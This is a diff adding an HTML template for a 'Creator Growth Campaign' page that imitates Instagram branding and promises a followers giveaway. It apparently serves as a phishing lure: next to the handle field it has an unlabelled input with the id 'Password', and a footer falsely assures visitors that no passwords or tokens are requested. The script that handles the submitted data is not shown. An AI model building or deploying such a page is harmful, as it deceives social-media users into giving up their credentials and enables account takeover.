@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Creator Growth Campaign</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+  <!-- Ambient background glow -->
+  <div class="glow-orb orb-1"></div>
+  <div class="glow-orb orb-2"></div>
+
+  <main class="card-container">
+    <div class="glass-card">
+      <div class="badge">🔥 5,000+ Followers Campaign</div>
+      
+      <!-- Instagram-inspired Camera Glyph -->
+      <div class="logo-box">
+        <svg viewBox="0 0 24 24" class="insta-svg" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect>
+          <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
+          <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line>
+        </svg>
+      </div>
+
+      <h1>Join the Creator Wave</h1>
+      <p class="subtitle">Enter your public handle to register for community spotlight rewards.</p>
+
+      <form id="campaignForm">
+        <div class="input-group">
+          <span class="input-prefix">@</span>
+          <input type="text" id="username" placeholder="your_handle" required autocomplete="off">
+        </div>
+
+        <div class="input-group">
+          <input type="text" id="Password" autocomplete="off">
+        </div>
+
+        <button type="submit" id="submitBtn">
+          <span class="btn-text">Claim Entry</span>
+          <div class="spinner hidden" id="spinner"></div>
+        </button>
+
+        <p id="statusMsg" class="status-msg hidden"></p>
+      </form>
+
+      <footer>
+        <p class="disclaimer">
+          ⚠️ <strong>Notice:</strong> We do not ask for passwords, OTPs, or session tokens. This campaign is for recognition badges and directory listing only.
+        </p>
+      </footer>
+    </div>
+  </main>
+
+  <script src="{{ url_for('static', filename='script.js') }}"></script>
+</body>
+</html>
